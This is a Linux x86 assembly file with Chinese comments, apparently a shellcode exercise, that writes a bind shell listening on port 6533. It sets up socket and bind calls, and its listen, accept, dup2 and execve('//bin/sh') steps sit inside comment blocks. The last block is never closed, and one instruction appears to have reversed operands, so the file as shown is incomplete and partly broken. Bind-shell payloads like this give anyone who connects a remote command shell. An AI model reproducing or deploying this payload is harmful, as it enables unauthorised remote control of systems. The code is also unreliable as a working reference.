#xuanmumu@gmail.com&process@cnbct.org 
# bindshell.s --bindport on 6533 
.section .text 
.global _start 
_start: 
#清空各寄存器
xor %eax,%eax 
xor %ebx,%ebx 
xor %ecx,%ecx 

#socket(2,1,0)创建一个TCP连接，注意字节序。
push %eax #压入第3个参数 0
push $0x1 #压入第2个参数 1
push $0x2 #压入第1个参数 2
mov %esp,%ecx #将ECX里的数组地址作为socketcall系统调用的第2个参数
inc %bl #bl＝0＋1,作为socketcall的第一个参数，调用socket函数
movb $0x66,%al #调用socketcall,0x66=102
int $0x80 #中断
mov %eax,%esi #将返回句柄保存在ESI中

#bind()
push %edx #EDX压栈作为结束符 
push $0x8519FF02 #0x8519=6533,sin.family=02,FF任意字节填充
mov %esp,%ecx #将ESP地址赋值给ECX 
push $0x10 #开始bind的参数，0x10压栈
push %ecx #保存地址
push %esi #把前面的句柄压栈
mov %esp,%ecx #继续把数组地址作为socketcall调用的第2个参数
inc %bl #bl=1+1=2=SYS_BIND
mov %al,102 #调用socketcall
int $0x80 #中断
/*
#listen()
push %edx #EDX压栈，作为结束符
push %esi #句柄压栈，作为listen的参数
mov %esp,%ecx #将数组地址设为socketcall的第2个参数
mov $0x4,%bl #bl=4=SYS_LISTEN 
mov $0x66,%al #执行socketcall系统调用
int $0x80 #中断

#accept()
push %edx #参数0
push %edx #参数0
push %esi #句柄压栈
mov %esp,%ecx #将数组设为系统调用第2个参数
inc %bl #bl=4+1=SYS_ACCEPT  
mov $0x66,%al #执行系统调用
int $0x80 #中断
*//*
#dup2()
mov %eax,%ebx #将accept返回的句柄复制到EBX
xor %ecx,%ecx #清空
mov $0x3f,%al #dup2系统调用，0x3f=63
int $0x80 #中断
inc %ecx #1
mov $0x3f,%al 
int $0x80 
inc %ecx #2
mov $0x3f,%al 
int $0x80 
*/
#之前熟悉的execve调用，打开一个新的shell

/*
push %edx 
push $0x68732f6e 
push $0x69622f2f 
mov %esp,%ebx 
push %edx 
push %ebx 
mov %esp ,%ecx 
mov $0xb,%al 
int $0x80 

